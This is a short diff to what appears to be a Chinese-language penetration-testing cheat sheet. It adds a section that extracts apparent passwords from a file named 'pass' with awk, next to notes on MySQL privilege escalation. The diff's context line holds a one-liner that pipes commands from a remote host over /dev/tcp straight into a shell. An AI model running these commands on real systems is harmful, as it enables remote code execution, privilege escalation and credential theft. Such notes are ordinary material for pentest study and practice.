@@ -113,6 +113,9 @@ cat < /dev/tcp/192.168.204.129/80 | sh
 
 ### doas
 
+### 提取
+cat pass | awk -F' ' '{print $2}'          
+
 ### mysql提权思路
 mysql -u root
 show databases;
